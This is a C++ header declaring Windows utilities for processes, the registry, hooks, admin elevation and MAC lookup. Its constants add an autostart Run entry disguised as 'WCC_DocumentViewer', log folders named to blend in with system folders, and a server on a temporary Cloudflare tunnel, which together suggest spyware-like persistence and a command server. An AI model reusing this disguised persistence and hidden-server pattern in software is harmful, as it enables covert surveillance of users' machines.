#pragma once

#include <windows.h>
#include <string>
#include <vector>

namespace Utils {
    // ↓↓↓ String conversion utilities ↓↓↓
    std::string WStringToString(const std::wstring& wstr);
    std::wstring StringToWString(const std::string& str);
    std::string UrlEncode(const std::string& str);
    
    // ↓↓↓ Logging utilities ↓↓↓
    void LogAction(const std::string& userID, const std::string& action);
    void LogAction(const std::string& userID, const std::string& action, const std::string& details);
    bool InitializeLogging(const std::string& logFileName);
    void FlushLogs();
    
    // ↓↓↓ System utilities ↓↓↓
    std::string GetMacAddress();
    bool IsRunningAsAdmin();
    bool ElevateToAdmin(const std::string& executablePath);
    
    // ↓↓↓ Process utilities ↓↓↓
    bool FindProcessByName(const std::string& processName, std::vector<DWORD>& processIds);
    bool TerminateProcessSafely(DWORD processId, const std::string& processName = "");
    std::string GetProcessExecutablePath(DWORD processId);
    
    // ↓↓↓ File system utilities ↓↓↓
    bool SafeCreateDirectory(const std::string& path);
    bool SafeDeleteFile(const std::string& path, int maxRetries = 3);
    bool SafeWriteFile(const std::string& path, const std::string& content);
    bool DeleteFolderRecursively(const std::string& folderPath);
    std::string GetExecutableDirectory();
    std::string GetAppDataPath();
    std::string GetProgramDataPath();
    
    // ↓↓↓ Registry utilities ↓↓↓
    bool SetRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName, const std::string& value);
    bool DeleteRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName);
    std::string GetRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName);
    
    // ↓↓↓ System state utilities ↓↓↓
    bool RestorePowerManagementSettings();
    bool RestoreSystemExecutionState();
    bool CleanupSystemHooks();
    
    // ↓↓↓ Error handling utilities ↓↓↓
    std::string GetErrorMessage(DWORD errorCode);
    void LogError(const std::string& userID, const std::string& operation, DWORD errorCode);
    bool IsRetryableError(DWORD errorCode);
    
    // ↓↓↓ Constants ↓↓↓
    namespace Constants {
        // Timing constants
        const int BROWSER_CHECK_INTERVAL = 250;
        const int SECURITY_CHECK_INTERVAL = 1000;
        const int ACTIVEX_WAIT_TIME = 3000;
        const int HOOK_RETRY_INTERVAL = 10000;
        
        // Retry constants
        const int MAX_HTTP_RETRIES = 5;
        const int MAX_FILE_RETRIES = 3;
        const int MAX_PROCESS_RETRIES = 3;
        
        // Browser constants
        const int BROWSER_WIDTH = 600;
        const int BROWSER_HEIGHT = 500;
        const int BROWSER_LOAD_DELAY = 3000;
        
        // Server constants
        const wchar_t* SERVER_URL = L"found-conducting-kit-often.trycloudflare.com";
        const int SERVER_PORT = 443;
        const bool USE_HTTPS = true;
        
        // File paths
        const char* AUTOSTART_REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        const char* AUTOSTART_VALUE_NAME = "WCC_DocumentViewer";
        const char* LOG_FOLDER_APPDATA = "\\Windows";
        const char* LOG_FOLDER_PROGRAMDATA = "\\ipTime";
        const char* MAIN_LOG_FILE = "system_log.txt";
        const char* REMOVER_LOG_FILE = "remover_log.txt";

        // Timer IDs
        const UINT SECURITY_CHECK_TIMER_ID = 1001;
        const UINT HOOK_RETRY_TIMER_ID = 2001;

        // Hook retry constants
        const int MAX_HOOK_RETRIES = 3;
        const int MAX_PROCESS_TERMINATION_WAIT = 5000;
    }
}